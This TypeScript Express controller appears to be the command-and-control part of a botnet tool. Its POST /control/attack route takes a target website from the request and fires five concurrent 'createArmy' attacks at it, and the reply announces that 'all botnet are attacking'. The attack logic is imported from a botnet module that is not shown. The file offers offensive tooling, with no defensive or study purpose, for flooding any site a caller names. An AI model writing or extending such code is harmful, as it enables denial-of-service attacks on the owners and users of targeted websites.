import {Request, Response, NextFunction} from 'express'
import botnet from '../utils/botnetArmy'

class ControlControllers {

    // [GET] /control
    index(req: Request, res: Response, next: NextFunction) {
        res.status(200).json({
            'status': 'Successfully',
            'message': 'Welcome! Our commander.'
        })
    }

    // [POST] /control/attack
    async attack(req: Request, res: Response, next: NextFunction) {
        try {
            const {websiteTarget} = req.body

            await Promise.all([
                botnet.createArmy(websiteTarget, 'Test'),  // 1
                botnet.createArmy(websiteTarget, 'Test'),  // 2
                botnet.createArmy(websiteTarget, 'Test'),  // 3
                botnet.createArmy(websiteTarget, 'Test'),  // 4
                botnet.createArmy(websiteTarget, 'Test'),  // 5
            ])

            res.status(200).json({
                status: 'Successfully',
                message: 'All botnet are attacking 💣'

            })
            
        } catch (error) {
            res.status(500).json(error)
        }
    }
}

export default new ControlControllers